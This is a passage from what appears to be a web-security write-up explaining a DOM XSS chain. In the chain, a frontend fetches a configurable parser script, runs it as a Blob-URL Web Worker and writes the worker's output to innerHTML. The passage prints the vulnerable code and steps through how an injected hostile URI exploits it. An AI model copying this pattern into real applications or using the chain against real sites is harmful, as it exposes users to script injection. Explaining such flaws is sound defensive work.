// const config = await fetch('/api/v1/tenant/pipeline-config').then(r => r.json());
// const scriptText = await fetch(config.parserUrl).then(r => r.text());
// const blob = new Blob([scriptText], { type: 'application/javascript' });
// const worker = new Worker(URL.createObjectURL(blob));
// 
// worker.onmessage = function(e) {
//     if (e.data.type === 'PARSED_RESULT') {
//         document.getElementById('output').innerHTML = e.data.data; // DOM XSS Sink
//     }
// };

// 8. The browser successfully fetches the script via CORS, bypassing the Worker SOP via the Blob URI.
// 9. The malicious worker executes, firing the postMessage.
// 10. The main thread consumes the payload, achieving instant DOM XSS.
```
{% endstep %}

{% step %}
To support complex, distributed data processing while maintaining high UI responsiveness, frontend architects offloaded CPU-bound operations to Web Workers. To circumvent the strict Same-Origin limitations natively enforced by browsers on Worker instantiation, developers utilized a standard proxy mechanism: fetching remote scripts, converting them to local Blobs, and executing the local reference. The security failure stemmed from a complete breakdown in validation synchronization between the backend and the frontend. The backend developers assumed the browser would protect itself against remote execution via the SOP. The frontend developers explicitly engineered a mechanism to bypass the SOP, assuming the backend had already rigorously validated the origin of the configuration URIs. The attacker navigated this void by injecting a hostile URI into the backend configuration. The frontend obligingly pulled the script via CORS, encapsulated it into a trusted local execution context, and detonated the payload, establishing a flawless, bi-directional Client-Side Resource Manipulation exploit chain
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
